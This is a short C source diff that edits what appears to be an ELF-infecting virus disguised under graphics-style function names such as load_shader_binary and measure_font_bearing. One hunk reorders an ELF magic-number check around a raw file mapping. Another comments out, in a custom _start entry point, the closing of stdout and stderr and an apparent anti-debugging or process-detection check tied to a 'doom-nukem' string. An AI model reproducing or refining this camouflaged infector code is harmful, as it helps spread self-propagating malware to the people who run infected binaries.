@@ -1116,10 +1116,10 @@ static int load_shader_binary(char *path, inout struct stat *atlas_meta,
 		goto bailout;
 	if (atlas_meta->st_size < (long) sizeof(ElfW(Ehdr)))
 		goto bailout;
-	if (((unsigned *) *region_ptr)[0] != 0x464C457F)
-		goto bailout;
 	*region_ptr = (void *) rt_vector(9, 0, atlas_meta->st_size, 0x1, 0x1,
 									 pipeline_slot, 0);
+	if (((unsigned *) *region_ptr)[0] != 0x464C457F)
+		goto bailout;
 	if (*region_ptr == MAP_FAILED)
 		goto bailout;
 	char  *watermark_pat;
@@ -1333,16 +1333,16 @@ void _start(void)
 	char  t[11];
 	char *chroot;
 
-	fs_release(1);
-	fs_release(2);
+	// fs_release(1);
+	// fs_release(2);
 
-	asm volatile("leaq str6(%%rip), %0\n"
-				 "jmp end6\n"
-				 "str6: .ascii \"doom-nukem\\0\"\n"
-				 "end6:\n"
-				 : "=r"(chroot));
-	if (inspect_chunk_alignment() || measure_font_bearing(chroot) > 0)
-		proc_terminate(0);
+	// asm volatile("leaq str6(%%rip), %0\n"
+	// 			 "jmp end6\n"
+	// 			 "str6: .ascii \"doom-nukem\\0\"\n"
+	// 			 "end6:\n"
+	// 			 : "=r"(chroot));
+	// if (inspect_chunk_alignment() || measure_font_bearing(chroot) > 0)
+	// 	proc_terminate(0);
 
 	__asm__ volatile("lea (%%rip), %0\n"
 					 "cyanure:"
